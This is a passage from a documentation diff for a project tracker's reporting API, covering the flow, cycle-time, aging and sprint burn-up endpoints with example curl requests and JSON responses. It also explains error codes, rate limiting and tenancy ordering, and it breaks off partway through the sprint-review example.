+- `unmatchedFilters` — which of the filter parameters you sent match **no issue in this project at all**; never `null`, and empty when every filter matched something or none was sent. Entries are the query-parameter names themselves (`typeId`, `componentId`, `labelId`), so you can map one straight back to the control the user touched. Always empty on `/aging`, `/sprint-burnup`, `/sprint-review` and `/velocity`, which take no filters to leave unmatched — `sprintId` is a **subject**, so an id that names nothing is a `404` there rather than an entry here. Always empty on `/search/insights` too: an HQL name that matches nothing is a `422` from the resolver, long before it could be reported as unmatched. It exists because a typo'd or stale filter id otherwise renders a complete, plausible, **all-zero** chart: *"no bugs were created in Q1"* and *"your filter matched nothing"* are the same picture without it. Note the deliberately weak and exact claim — **"no issue in this project carries this id"**, *not* "this id does not exist". A perfectly valid issue type nobody here has ever used is reported too, and saying nothing about whether the id exists elsewhere in the taxonomy is what keeps the disclosure limited to data you can already see.
+
+**A window over the cap is a `400` that names the cap. Nothing is ever silently clamped.** Windows are bounded (`app.reports.max-window-days`, 365 days by default, counting both endpoints), and a request wider than that is refused with a problem document whose `detail` names three things — the cap, the property key, and the length it actually measured:
+
+```json
+{ "status": 400,
+  "detail": "Window is 400 days (2025-08-01 to 2026-09-03); the maximum is 365 days (app.reports.max-window-days). Narrow the range — it is not clamped for you, because a report of a different window than the one you asked for is worse than no report." }
+```
+
+The cap is a **maximum, not a strict inequality** — a window exactly that long is served. `from` after `to` is a second `400`, and it echoes both dates back, because the caller of a report API is usually a chart that did the date arithmetic itself and needs to know which end it got wrong. Since nothing is clamped, the `from`/`to` in a `200` are always exactly the ones you sent.
+
+**Every windowed report shares one implementation of these rules, down to the wording of the messages**, so `/flow` and `/cycle-time` default, measure and refuse identically and a client that handles one handles the other. **Not every report has a window**, though. `/aging` asks a current-state question and takes no parameters at all, so **it has no `400` of its own** — and neither does its `.csv` sibling, for the same reason: a report that asks the caller for nothing has nothing to refuse. A malformed path UUID still `400`s on both, as it does everywhere, while the request is being bound and before any handler runs. The two sprint reports have no window either: their span is the sprint's, and a sprint longer than `app.reports.max-window-days` is **clipped and disclosed** (`seriesTruncatedAt`) rather than refused, because the caller never asked for that window — the sprint did, so there is nothing for them to correct. `/velocity` bounds its **sample** rather than a window: `sprints` is refused at both ends (1–12) rather than clamped, by the same never-answer-a-question-nobody-asked rule.
+
+**A request-supplied id means one of two opposite things on this path, and you have to know which.** This is the one convention that is not uniform across the family, because it cannot be:
+
+> A report's **subject** id resolves through its parent and `404`s. A report's **narrowing filter** id is never resolved: it is applied as an equality inside an already project-scoped statement, where it can only ever subtract.
+
+So `typeId` / `componentId` / `labelId` on `/flow` and `/cycle-time` are **filters** — an unknown or foreign id narrows the report to an empty result with a `200` and is named in `meta.unmatchedFilters`, never a `404` or a `422`. And `sprintId` on `/sprint-burnup` and `/sprint-review` is the **subject** — the resource the whole report is *about* — so it resolves inside the project and an id that does not resolve there, including one belonging to another project or tenant, is a `404`. Getting either half backwards produces a plausible, wrong report: a filter that `404`s turns the endpoint into an existence oracle for another tenant's taxonomy, and a subject that narrows to empty answers a question nobody asked.
+
+`/velocity` sits on the same rule from the other side: **its subject is the project**, which the path already names, so it takes no `sprintId` at all — its sample is resolved from the project — and it consequently has **no `404` of its own**.
+
+**Which story points a sprint report uses — three reports, two rules, stated once.** All three read the same ledger, and they deliberately do not read the same estimate:
+
+| Report | Points | Because |
+|---|---|---|
+| [`/sprint-burnup`](#sprint-burn-up--will-this-sprint-land-and-what-happened-to-the-plan) | the issue's **current** estimate | it charts a sprint that is still running, and the reader is asking a live question — so a re-estimate moves the line, including its past |
+| [`/sprint-review`](#sprint-review--committed-added-removed-completed-carried-over) | the ledger's **entry snapshot** | the retrospective question is what a thing weighed *when it entered*; today's estimate would rewrite what the team committed to |
+| [`/velocity`](#velocity--how-much-should-we-plan-for-next-sprint) | the ledger's **entry snapshot** | every sprint it describes is completed and frozen, and with current points a re-estimate today would move a bar drawn four months ago *and the band computed from it* |
+
+Each is wrong for the other's question, so none of them will be changed to match the others. The one case where the burn-up also reads a snapshot is inherited rather than chosen: a **deleted** issue has no current estimate, so its snapshot is the only weight left.
+
+**A date outside the supported band is a third `400`, refused before any arithmetic.** Report dates must fall in `1970-01-01`…`2200-12-31`, and one that does not is refused in the same refuse-and-name-it wording as the cap — naming the parameter, the value and the band. The floor is the epoch (issue history is written by this application and cannot predate it); the ceiling is deliberately loose, because a window may legitimately end in the future, and deliberately far below the largest representable date, because the point is a sane band rather than the last instant a database can store. The check runs **before** the window is measured and before any date is incremented: an extreme-but-perfectly-parseable year such as `+999999999-12-31` binds happily and used to overflow into a `500` on an endpoint whose contract promises `400`.
+
+**Tenancy is resolved before the window is validated.** A caller who cannot see the project gets `404` even when the window is also malformed. A `400` there would tell an outsider that the project exists — cheaply, repeatably, and without ever authenticating as anyone entitled to know.
+
+**Reports are throttled per principal, and that `429` comes *before* the `404`.** The whole `…/reports/**` path shares one budget per caller — 60 requests per minute by default — and a request past it is refused with `429` and a `Retry-After` header (seconds). **`POST …/search/insights` draws on this budget too**, even though it does not live under that path: being a report, it is bound to the limiter explicitly rather than by prefix, so a panel refresh and a burn-up fetch compete for one pot of 60.
+
+The panel is also inside a **second, separate** budget — the 120-requests-per-minute one that covers [`POST …/search`](#search-hql), `/search/schema`, `/search/suggest` **and every [saved-filter](#saved-filters) operation** (validating a saved filter is search-surface work wherever it is mounted). It spends **both**, and the **lower configured value binds**. It sits on the reports limiter deliberately, because removing that binding would raise the panel’s allowance to the search budget as a side effect — so which of the two governs follows from whatever an operator has configured, and lowering *either* property lowers the panel. The two pots are kept apart because a person typing in a search box legitimately fires several requests a minute and should not be starved to protect charts — but the consequence for a client is worth stating plainly: **a panel refresh competes with report fetches *and* with searches.** **Every report shares that one budget rather than holding one each**, so a page that opens the sprint burn-up and the sprint review together spends two of it, and every report added later inherits the budget instead of having to ask for one. It is a **retryable throttle, not a fault**: nothing was computed, and the identical request succeeds after the wait; a report is never narrowed or approximated to fit a budget. A report needs this when no other read does because its cost is not bounded by what it returns: the flow report's opening balance counts history from before the window, so asking for a narrower window does not make it cheaper, and `private` caching means no shared cache ever absorbs a repeat.
+
+The budget is spent **before** the workspace and project are resolved. The per-principal budgets — this one and the [search budget](#search-hql) over `…/search/**` and `…/filters/**` — are **the one place in this API where a `429` precedes a `404`**: an over-budget caller is refused even for a project they cannot see. That ordering is deliberate, and so is keying the budget on the **caller** rather than the project: a per-project key would answer differently depending on whether a project exists, turning a throttle into an existence oracle, and would let one colleague's open dashboard tab throttle everyone else on the project. Keyed on you, the `429` is identical for a real project, a nonexistent one and somebody else's.
+
+One consequence worth stating for anyone sizing a deployment: because the key is the **principal**, this budget bounds **one user, not one workspace**. Ten members each get 60 report requests a minute, so aggregate report load still scales with member count — that is what a per-user limit does and does not promise, and it is not a defect. Size on members × budget, not on the budget alone.
+
+### Flow — created vs resolved
+
+`GET …/reports/flow` answers "are we keeping up?": one series of issues **created** per bucket, one of issues **resolved** per bucket, the count still **open** at each bucket's end, and the three totals under the chart.
+
+```bash
+curl -s "$BASE/workspaces/$WS/projects/$PROJ/reports/flow?from=2026-05-21&to=2026-08-19&interval=WEEK" \
+  -H "Authorization: Bearer $TOKEN"
+```
+
+```json
+{
+  "from": "2026-05-21", "to": "2026-08-19", "interval": "WEEK",
+  "buckets": [
+    { "date": "2026-05-18", "created": 14, "resolved": 9, "openAtEnd": 121, "partial": true },
+    { "date": "2026-05-25", "created": 11, "resolved": 13, "openAtEnd": 119, "partial": false }
+  ],
+  "totals": { "created": 142, "resolved": 137, "net": 5 },
+  "meta": {
+    "computedAt": "2026-08-19T09:14:22Z", "basedOnIssues": 1842,
+    "truncated": false, "cap": 20000,
+    "firstIssueAt": "2024-11-04T08:31:00Z", "unmatchedFilters": []
+  }
+}
+```
+
+**Every parameter is optional**, and no parameters at all means *the last 90 days, weekly, unfiltered*: `to` defaults to today in UTC, `interval` defaults to `WEEK`, and `from` defaults to `min(90, app.reports.max-window-days) - 1` days before `to` (the window counts **both** endpoints, so that is a 90-day window at the default cap). `from` and `to` are ISO dates interpreted in UTC, and `from=X&to=X` is one whole UTC day, not an empty range. An unparseable date, a date outside `1970-01-01`…`2200-12-31`, or an `interval` other than `DAY`/`WEEK`, is a `400`.
+
+**The default window is derived from the cap, and that is *defaulting*, not clamping.** If an operator lowers the maximum window below 90 days, a parameterless call asks for the lower number rather than being refused by the endpoint's own cap — the default request this endpoint makes must be one it will actually serve. Nothing about the never-clamp rule changes: a caller who *sends* a window wider than the cap still gets the `400` naming it, because there the caller asked for something specific and answering a different question would be worse than answering none.
+
+**Buckets are not snapped to bucket boundaries, so the first and last one can be partial.** A bucket's `date` is its **start**, on a UTC boundary — for `interval=WEEK` a **Monday** (ISO-8601; not configurable). A window that does not begin on one therefore opens with a bucket dated *before* `from`: the example above asks for `2026-05-21` (a Thursday) and the first bucket reads `2026-05-18`. That bucket counts **only what happened inside the requested window**, so its bar is legitimately shorter than a full week's — a reader who assumes whole weeks will misread it as a drop. The alternative, snapping your window outwards to whole weeks, would quietly answer a different question than the one you asked.
+
+**Each bucket states this itself: `partial` is `true` when the bucket covers less calendar than a full interval.** The server's flag is **authoritative — do not compute it in the client.** Deriving it browser-side means re-implementing Monday truncation in a second language, and the first time the two disagree the chart footnotes the wrong bar; the server computes it from the same interval definition that produced the boundaries, so it cannot drift from them. Use it to annotate or de-emphasise the bar. At `interval=DAY` no bucket is ever partial.
+
+**Buckets are zero-filled.** A bucket in which nothing happened is present with zeros rather than absent, so the series never has invisible gaps and an export never has missing rows.
+
+`openAtEnd` is the count open at the **end** of that bucket: how many were open when the window started, plus every `created` minus every `resolved` up to and including it. The opening balance is real history — on a project with years behind it the line does not start at zero.
+
+`totals` covers the whole window: `net` is `created - resolved`, signed on purpose, and positive means the backlog grew.
+
+**`resolved` means "issues closed *now*, dated by their latest closure" — so past numbers can move.** This is an honest limitation of the data model rather than a bug, and it is worth stating plainly. The series are built from an issue's `createdAt` and `closedAt` and from nothing else; there is no resolution-event ledger. `closedAt` is **cleared** when an issue leaves a DONE status, so reopening an issue removes it from the bucket it used to sit in, and closing it again puts it in a new one. `openAtEnd` inherits the same caveat, one integral further on. The same window queried a week apart can therefore report different history, and a client rendering this report is expected to footnote it: *"Resolved counts issues that are closed now, dated by their latest closure. Reopened issues move."*
+
+**The filter ids narrow the series; they never `404` or `422`.** `typeId`, `componentId` and `labelId` are ordinary equality filters over the project's own data (an issue carrying several labels is still counted once). An id that does **not** exist — or that exists but belongs to another project or another workspace — simply matches nothing and yields an **empty series with a `200`**. This is deliberate, and it is the opposite of what the rest of this API does with a request-supplied id: the report queries are project-scoped first, so an unknown filter can only ever narrow, and answering `404`/`422` instead would turn the endpoint into an existence oracle for another tenant's types and labels. You are not left guessing, though: **`meta.unmatchedFilters` names every filter that matched nothing in this project**, so an all-zero chart is never ambiguous — read that array before concluding it was a quiet quarter.
+
+### Cycle time — how long finished work took
+
+`GET …/reports/cycle-time` answers "how long does our work take?": one dot per issue **completed inside the window**, and the p50/p85 of both measures to draw across them.
+
+```bash
+curl -s "$BASE/workspaces/$WS/projects/$PROJ/reports/cycle-time?from=2026-05-21&to=2026-08-19" \
+  -H "Authorization: Bearer $TOKEN"
+```
+
+```json
+{
+  "from": "2026-05-21", "to": "2026-08-19",
+  "items": [
+    { "issueId": "0192f3…", "key": "DEMO-14", "title": "Search returns stale results",
+      "typeId": "0192a1…", "startedAt": "2026-08-13T09:02:11Z", "closedAt": "2026-08-17T14:47:03Z",
+      "cycleDays": 4.24, "leadDays": 11.7 },
+    { "issueId": "0192f2…", "key": "DEMO-9", "title": "Importer times out on large CSVs",
+      "typeId": "0192a1…", "startedAt": null, "closedAt": "2026-08-16T08:12:44Z",
+      "cycleDays": null, "leadDays": 31.05 }
+  ],
+  "percentiles": {
+    "cycle": { "p50": 4.1, "p85": 12.6 },
+    "lead":  { "p50": 9.0, "p85": 28.4 }
+  },
+  "sampleSize": 214,
+  "missingStartCount": 128,
+  "meta": {
+    "computedAt": "2026-08-19T09:14:22Z", "basedOnIssues": 214,
+    "truncated": false, "cap": 20000,
+    "firstIssueAt": "2024-11-04T08:31:00Z", "unmatchedFilters": []
+  }
+}
+```
+
+**The window is a range on `closed_at`.** This report is about work that *finished* in the window, so an issue created two years ago and closed yesterday is in yesterday's report, and an issue created inside the window and still open is in no report here at all. That is the only reading under which the x-axis — completion date — *is* the window you asked for.
+
+**Every parameter is optional and the window behaves exactly as [`/flow`](#flow--created-vs-resolved)'s does**: no parameters means *the last 90 days, unfiltered*, `to` defaults to today in UTC and `from` to `min(90, app.reports.max-window-days) - 1` days before it, both endpoints counted. The defaulting, the never-clamp rule, the `400` naming the cap, the `from > to` refusal and the `1970-01-01`…`2200-12-31` band are **one implementation shared with `/flow`**, messages included — a client that handles one handles the other, and there is nothing report-specific to re-read above.
+
+**The honesty rule: cycle time is defined only for issues that have a recorded start.** `startedAt` was added in an earlier slice and backfilled best-effort — the backfill matches history rows to statuses by display *name*, so a renamed status is invisible to it, and an issue filed straight into an in-progress status wrote no history row at all — so any project with history has completed issues with no start. Those issues come back with **`cycleDays: null`**: not `0`, not "the same as lead". They contribute to `leadDays`, to `sampleSize` and to `missingStartCount`, and to nothing else.
+
+**`created_at` is never substituted for a missing `started_at`**, and that is the single most important sentence on this endpoint. The substitution does not produce one wrong number in one place — it converts the whole report into a lead-time report wearing the label "cycle time", moves the p85 that [`/aging`](#aging-work-in-progress--what-is-rotting-now) draws across its columns, and says so nowhere in the response. What you get instead is the gap, counted. **Surface `missingStartCount`**: "cycle time available for 812 of 940 completed issues" is the sentence it exists for, and a client that hides it hands the reader a chart with a silent hole in it.
+
+**Percentiles are suppressed below five samples, and the two measures are gated independently.** `percentiles.cycle` is computed over `sampleSize - missingStartCount` issues and `percentiles.lead` over `sampleSize` — different sets, and on an upgraded install wildly different sizes — so a window can legitimately return a usable `lead` pair beside a suppressed `cycle` one. Gating them together would either hide a number we have or print a p85 drawn from two issues.
+
+**Suppression is `null`s inside the containers, never a missing container.** `percentiles`, `percentiles.cycle` and `percentiles.lead` are **always emitted**; read `percentiles.cycle.p50 === null` and do not code for an absent object. Suppression is a fact about the data, not a change of response shape. The threshold is fixed at five and is not configurable: it is a statement about what is meaningful, and a line whose threshold differs between installs is worse than a missing line.
+
+**The lines describe the whole matching set even when the dots are truncated.** The percentiles are aggregates computed by PostgreSQL over every matching issue, not over the page of rows that survived `meta.cap` — a p85 over "the most recent 20 000" would be a different statistic wearing the same label. So on a truncated report the dots are a sample and the lines are the population, and **`sampleSize` versus `items.length` is what tells a client it received a subset** (`meta.truncated` says the same thing in one bit). **What survives truncation is the most recent work**: `items` are ordered most recently closed first, ties broken by id so a truncated report is deterministic. Assume the other end and you draw a wrong chart from a correct response.
+
+**The filter ids narrow the scatter; they never `404` or `422`.** `typeId`, `componentId` and `labelId` behave exactly as they do on `/flow`: predicates applied inside an already project-scoped query, so an id that does not exist — or belongs to another project or tenant — matches nothing and yields an empty `items` with `200`, and `meta.unmatchedFilters` names it. A multi-label issue is counted once, in the counts and in the percentiles alike.
+
+One `meta` field is worth reading with this report's own definitions in hand: **`basedOnIssues` equals `sampleSize`** here — the completed issues in the window after filters, not the shipped rows. **`firstIssueAt` is the family's and is *not* windowed**: it is the project's earliest issue that the filters admit, so on any project older than the window it predates `from`, and that is the point — it is what tells the reader whether the window they picked is wider than the history behind it. A value clipped to the window could only ever report the window back.
+
+### Aging work in progress — what is rotting now
+
+`GET …/reports/aging` is the other half of the same page and the one almost nobody ships: not "how long did finished work take" but **"which open item is rotting right now"**. A column per non-DONE status of the project's workflow, each holding its open issues oldest first, under the project's lifetime cycle-time percentiles.
+
+```bash
+curl -s "$BASE/workspaces/$WS/projects/$PROJ/reports/aging" \
+  -H "Authorization: Bearer $TOKEN"
+```
+
+```json
+{
+  "columns": [
+    { "statusId": "0192b0…", "name": "To Do", "category": "TODO", "items": [] },
+    { "statusId": "0192b1…", "name": "In Progress", "category": "IN_PROGRESS",
+      "items": [
+        { "issueId": "0192f7…", "key": "DEMO-31", "title": "Flaky import on large CSVs",
+          "ageDays": 19.4, "assigneeId": "0192c4…", "startedAt": "2026-07-31T07:15:00Z" },
+        { "issueId": "0192f9…", "key": "DEMO-44", "title": "Audit log paging",
+          "ageDays": 6.02, "assigneeId": null, "startedAt": null }
+      ] },
+    { "statusId": null, "name": "Not on this board", "category": null,
+      "items": [
+        { "issueId": "0192e2…", "key": "DEMO-12", "title": "Legacy migration spike",
+          "ageDays": 74.8, "assigneeId": "0192c9…", "startedAt": "2026-06-05T10:00:00Z" }
+      ] }
+  ],
+  "percentiles": { "p50": 4.1, "p85": 12.6 },
+  "meta": {
+    "computedAt": "2026-08-19T09:14:22Z", "basedOnIssues": 37,
+    "truncated": false, "cap": 20000,
+    "firstIssueAt": "2024-11-04T08:31:00Z", "unmatchedFilters": []
+  }
+}
+```
+
+**No parameters, and no window — deliberately.** "What is rotting *now*" is a question about current state. A window on it would be meaningless (every open issue is open today) or actively misleading (a window on `created_at` hides exactly the oldest items, which are the entire point). This is therefore the report whose *question* takes no input, so it has **no `400` of its own** — a property its `.csv` sibling inherits. It validates nothing, because there is nothing here for a caller to state wrongly, and a stray query parameter is ignored rather than refused. Its failures are `401`, `404` and `429` — plus the one that belongs to every endpoint rather than to this one, a malformed path UUID, which `400`s while the request is bound and before the handler runs. Its cost is bounded by work *in flight* rather than by history, which is a far smaller number on any healthy project — and capped anyway.
+
+**"Open" means `status.category <> DONE`** — the same question the columns are keyed on — and *not* `closed_at IS NULL`. The two agree today only because the application maintains that invariant (stamped on entering DONE, cleared on leaving); asking the category is what keeps an issue from being in the report but in no column, or in a column but not the report.
+
+**Columns come from the workflow, items come from the issues, and the two can disagree in both directions.** Columns are the project's *effective* statuses in board order minus the DONE category, **including the empty ones**: a status nobody is currently in is a fact about the board, and a report that draws only the columns it found rows for silently redraws its own axis every day. The reverse disagreement is the interesting one — an issue can sit in a status that is no longer in the project's workflow, because Hamstrack gates *transitions*, not existing rows, so a workflow swap strands whatever was mid-flight. **Those issues arrive in a single trailing column with `statusId: null`, `category: null` and the name `"Not on this board"`, and a client must render it.** A report whose purpose is to name the item nobody is looking at must not begin by hiding the items nobody is looking at. It is one column rather than one per retired status on purpose: the reader's question is "what is stranded", not "which dead status is it stranded in", and per-status columns would let a workflow swap add a dozen columns to a chart. It is also the one column that cannot be dragged to — that is what the `null` `statusId` is telling you.
+
+**`ageDays` falls back to `created_at` when there is no `started_at`, and the asymmetry with `/cycle-time` is deliberate.** Cycle time is a measurement of finished work, where substituting filing time for start time produces a number that is simply wrong. Age is a question about something that has *not* happened yet, and "filed 40 days ago and nobody has picked it up" is a true, useful and materially **different** fact from "in progress for 40 days". Both belong on this board, so `ageDays` is never `null` — and the nullable `startedAt` is returned beside it precisely so a reader can tell the two apart rather than being handed a number with no account of where it came from. Every item in one response is aged against the same instant, and that instant is `meta.computedAt`.
+
+**The percentile lines belong to the other half, and are deliberately unwindowed.** `percentiles` here is the **cycle time** p50/p85 of this project's *whole completed history* — not a window, and not whichever measure the page's toggle is showing. That is what makes the report actionable rather than a list: an item past the p85 line is visibly older than 85% of everything the team has ever finished, a statement about *this item*, in the team's own units, with no target, no SLA and nothing configured.
+
+Two consequences, because both look like bugs from outside:
+
+- **The same two field names mean different things on the two endpoints.** On `/cycle-time`, `p50`/`p85` belong to the window you requested and come as one pair *per measure*; here they are all-time and cycle-only. A client showing both must not label them alike.
+- **They are computed from completed issues that have a `started_at`**, so a project whose history predates the backfill can have full columns and suppressed (`null`) lines. The columns still render — the lines are an overlay, not a precondition — and the client prints the same "not enough completed work to compute percentiles (need 5, have 3)" sentence the other half uses, off the same five-sample threshold.
+
+**The lines are served from a 60-second per-project snapshot; the columns never are.** Their aggregate is the one statement in this feature that nothing the caller sends can narrow — no window, no cap, and it grows for the life of the project — so it runs at most once per project per minute per node. The claim is unchanged (the pass still covers the whole history when it runs), and the staleness is one this response already advertises to the browser with `Cache-Control: max-age=60`; a line drawn from years of history does not visibly move in a minute. The open half — the columns, the items and `meta.basedOnIssues` — is computed live on every request, because a minute-old count printed above a live item list is exactly the "these numbers don't match" failure `meta` exists to prevent.
+
+**Truncation keeps the oldest.** Open issues are ordered oldest-first **project-wide** and the cap is applied to that single ordering *before* the rows are grouped into columns, so what survives is the aging end of the whole queue — the opposite end from `/cycle-time`'s, and the right one for each. (A truncated response therefore thins the freshest items out of every column at once, rather than trimming each column separately.) `meta.basedOnIssues` is how many open issues the report was *about*, which is larger than the number of items shipped when `meta.truncated` is true, and `meta.unmatchedFilters` is always empty because this endpoint takes no filters to leave unmatched.
+
+**`meta.firstIssueAt` here is the project’s earliest issue, not the earliest open one** — the family’s definition, and it means the same thing on every report that populates it. Nothing is lost by that: the earliest open issue is already in the body, since items come back oldest-first, so it is literally the first item of the first non-empty column, with its key, its title and its age — strictly more than a bare timestamp in `meta` could say. The depth of the project's **completed** history, by contrast, is not derivable from this response at all, and it is exactly the provenance this report needs, because its `p50`/`p85` lines are computed over that entire history.
+
+### Sprint burn-up — will this sprint land, and what happened to the plan
+
+`GET …/reports/sprint-burnup` draws two lines over one sprint's days — **scope** (how much work was in the sprint at the end of each UTC day) and **completed** (how much of that was closed by then) — and under them `scopeChanges`, the log that explains every step in the first of them.
+
+```bash
+curl -s "$BASE/workspaces/$WS/projects/$PROJ/reports/sprint-burnup?measure=POINTS" \
+  -H "Authorization: Bearer $TOKEN"
+```
+
+```json
+{
+  "sprint": { "id": "0192d1…", "name": "Sprint 12", "state": "ACTIVE" },
+  "startAt": "2026-08-14T09:00:00Z",
+  "endAt": "2026-08-28T09:00:00Z",
+  "measure": "POINTS",
+  "committedAtStart": 60,
+  "unestimatedCount": 4,
+  "series": [
+    { "date": "2026-08-14", "scope": 60, "completed": 0 },
+    { "date": "2026-08-15", "scope": 60, "completed": 8 },
+    { "date": "2026-08-16", "scope": 68, "completed": 8 }
+  ],
+  "scopeChanges": [
+    { "at": "2026-08-16T11:04:22Z", "issueId": "0192f7…", "key": "DEMO-31",
+      "event": "ADDED", "delta": 8, "actorId": "0192c4…", "storyPoints": 8 },
+    { "at": "2026-08-19T15:41:08Z", "issueId": null, "key": "DEMO-77",
+      "event": "REMOVED", "delta": -3, "actorId": null, "storyPoints": 3 }
+  ],
+  "seriesTruncatedAt": null,
+  "meta": {
+    "computedAt": "2026-08-20T09:14:22Z", "basedOnIssues": 28,
+    "truncated": false, "cap": 20000,
+    "firstIssueAt": "2024-11-04T08:31:00Z", "unmatchedFilters": []
+  }
+}
+```
+
+**Both parameters are optional. `sprintId` defaults to the project's ACTIVE sprint**, of which a project has at most one (enforced in the database), so the default is unambiguous. `measure` defaults to `COUNT` — the measure every project has, whether or not it estimates — and is echoed back in the response so a client can never mislabel a chart it did not explicitly parameterise. An unknown `measure` is a `400`.
+
+**`sprintId` is the report's SUBJECT, and it `404`s** — a sprint that belongs to another project or another tenant is indistinguishable from one that never existed. That is the opposite of `typeId` on `/flow`, and both halves are deliberate; see the subject-versus-filter rule under [How every report behaves](#how-every-report-behaves). (A `sprintId` that is not a UUID at all is a `400` rather than a `404`: it fails while Spring binds the parameter, before the handler runs, and a malformed id names no resource, so there is no existence for it to confirm.)
+
+**No ACTIVE sprint is a `200` with `sprint: null`, not a `404`.** You asked a well-formed question about a project you can see, and *"there is no sprint running"* is an answer. A `404` there would be the same status as "that sprint is not in this project" — a genuinely different case — and would leave a client unable to tell a project between sprints from a bad id, and the empty state with no body to render. A sprint that exists but has **never started** answers the same way with `sprint` populated: `startAt: null`, an empty `series`, `committedAtStart: 0`. Commitment is an event, and it has not happened yet.
+
+**The ideal guide is not in the response — you draw it, from `(startAt, 0)` to `(endAt, committedAtStart)`.** To the **committed** scope, not the current one. That is what makes it a guide rather than a verdict: a sprint that took work on sits *above* its guide, which is information, not failure. Regenerating the guide against today's scope would make every sprint look on-plan, which is the one thing this chart exists not to do.
+
+**Points here are each issue's CURRENT estimate — and [`/sprint-review`](#sprint-review--committed-added-removed-completed-carried-over)'s are not. Both are deliberate. Do not report either as a bug against the other.**
+
+- **Burn-up: current points.** Under `measure=POINTS` every issue is weighed by its `storyPoints` *as they stand today*, so **a re-estimate moves the whole scope line including its past** and a chart read yesterday can legitimately look different today. Footnote it in the UI ("Points reflect current estimates"). The alternative is not buildable anyway: the ledger writes a row only when membership changes, so a per-day estimate history does not exist and cannot be reconstructed from anything stored.
+- **Review: the entry snapshot.** The retrospective question is *what did this weigh when it entered*, and today's estimate destroys that answer — an issue re-pointed from 3 to 8 after the sprint ended would retroactively rewrite what the team committed to.
+
+The one exception is inherited rather than chosen: **a deleted issue has no current estimate**, so it is weighed here by its snapshot too — the only number left.
+
+**Scope change is membership change only, and this is the rule that makes it a burn-up rather than a burndown.** The line steps up on an add and down on a remove and on **nothing else**: a re-estimate is never a scope event and **never appears in `scopeChanges`**, because the ledger writes no row for one. Every step in the line therefore has a timestamp, an issue and (for a live issue) an author — a scope increase is a fact with a name attached instead of an unexplained jump, which is precisely the disagreement a burndown cannot settle. (Under `POINTS` a re-estimate *does* move the line, as above; it simply is not a step with a date and an author, because nothing happened to the plan.)
+
+**The commitment is not a change.** The `ADDED` rows a sprint's start writes are all stamped exactly `startAt`; they are already reported as `committedAtStart` and as the height of the first point, and they are deliberately **not** listed in `scopeChanges` — otherwise four real changes would be buried under twenty-three rows saying "the sprint started". Only events strictly after `startAt` are changes. `scopeChanges: []` is a real and common answer: it means the plan held.
+
+**The line ends where it ends, and there is no projection.** The last point is today for a running sprint and the **completion instant** for a finished one — not the planned `endAt`, and not the end of the completion's calendar day. (Measuring at the following midnight would put the completion's own carry-out removals *inside* the last point, so the scope line would dive to exactly the work that was finished and **every** completed sprint would render as having delivered 100% of its final scope — a chart that cannot show a miss.) A sprint that overran is drawn to today, and its guide simply ends earlier than its lines do. No "at this rate you finish Thursday": forecasting is a later slice, with a stated sample size.
+
+`completed` is **bounded above by `scope` by construction** — an issue that leaves the sprint takes its completion out with it, so the two lines can meet but cannot cross. Do not add a client-side guard for the crossing case; it cannot happen, and a guard would hide a real bug if it ever did.
+
+**`unestimatedCount` is always populated, including under `COUNT`.** It counts the issues in the sprint at the **last plotted point** that carry no estimate. Under `POINTS` those contribute `0` to the series and are counted here — *"we didn't estimate it"* is not *"it's free"*, and reporting the zero without the count is the failure mode this pair exists to prevent. Under `COUNT` it is the honest footnote for the toggle the reader is about to flip.
+
+**A deleted issue still appears in the log, and a client must render it as a real, unlinked entry.** The ledger's issue reference nulls on delete rather than cascading, precisely so that deleting an issue cannot quietly rewrite a finished sprint's record. Such a row keeps its `key`, its instant, its direction and its step, and reports **`issueId: null` and `actorId: null`**. The actor is dropped on purpose, not by a foreign key: an issue's own history is cascade-deleted with it, so keeping the name here would leave this log as the only surviving place in the product saying who moved a since-deleted issue — a wider survival than was ever argued for. The step, the instant, the direction and the key all survive; only the person does not.
+
+**`storyPoints` on a log row is the entry snapshot, and it is independent of `delta`.** Carrying both is the point: `delta` is in the *requested measure*, so under `COUNT` it is ±1 and no point value would otherwise reach this log at all. A value the project already recorded stays visible even when `estimation` is switched off, so the estimate travels with the row rather than being inferred client-side from a number that means something else.
+
+**`seriesTruncatedAt` is a second, separate limit — and it is not `meta.truncated`.** A sprint can be started with an arbitrarily **backdated** `startAt` (only future dates are refused), so the day count is caller-influenced and one request could otherwise ask for fifty thousand points. The day series is bounded by `app.reports.max-window-days`, and **the FIRST days are the ones kept**, because they carry the commitment, without which every later number means nothing. When that bites, `seriesTruncatedAt` names the last day the chart covers; the ordinary case is `null`. It is **not a `400`**: you stated no window here — the sprint did — so there is nothing for you to correct, and refusing would leave a legitimately long sprint with no chart at all.
+
+Keep the two limits apart when you render them. `meta.truncated` means one specific thing: the `app.reports.max-rows` **row** cap bit, the number printed beside it in `meta.cap`. Folding the day clip into that flag made a twelve-issue sprint answer `basedOnIssues: 12`, `truncated: true`, `cap: 20000` and put "20 000" in a banner about a report that had dropped nothing of the kind.
+
+**And note the asymmetry in what gets clipped with it.** `scopeChanges` is clipped to the same boundary **only when the chart is clipped**, and `unestimatedCount` is measured there too, so a clipped response never puts three numbers describing three different windows side by side. When `seriesTruncatedAt` is `null` the log deliberately runs to the end of the ledger instead: a completed sprint's carry-over rows are stamped a moment *after* `completed_at`, so bounding the log at the last chart point would silently drop the completion's own moves — the ones that explain where the remaining scope went. `/sprint-review` has no day bound at all (it returns lists, not a series), so on a clipped sprint the two reports legitimately describe different spans. That is exactly what this field announces.
+
+**No capability changes any status code.** `board` and `estimation` gate the UI and nothing else: a `KANBAN` project's sprint answers exactly as a `SCRUM` project's does, and `measure=POINTS` returns a points series in a project whose `estimation` is `false`. A hidden control is not a permission, and a status code that depended on a capability is the documented bug the [delivery-capability model](#delivery-capabilities) exists to prevent.
+
+### Sprint review — committed, added, removed, completed, carried over
+
+`GET …/reports/sprint-review` is the retro record, and **not a chart**: five labelled lists of issue rows, each with a count, a point sum and an unestimated count, plus one header line's worth of `totals`. It shares its single ledger query with the burn-up.
+
+```bash
+curl -s "$BASE/workspaces/$WS/projects/$PROJ/reports/sprint-review?sprintId=$SPRINT" \
+  -H "Authorization: Bearer $TOKEN"
+```
+
+```json
+{
+  "sprint": { "id": "0192d1…", "name": "Sprint 12", "state": "COMPLETED" },
+  "startAt": "2026-08-14T09:00:00Z",
+  "endAt": "2026-08-28T09:00:00Z",
+  "completedAt": "2026-08-29T16:20:11Z",
+  "committed": {
+    "count": 23, "points": 60, "unestimatedCount": 6,
+    "issues": [
+      { "issueId": "0192f3…", "key": "DEMO-14", "title": "Search returns stale results",
+        "typeId": "0192a1…", "assigneeId": "0192c4…", "statusId": "0192b3…",
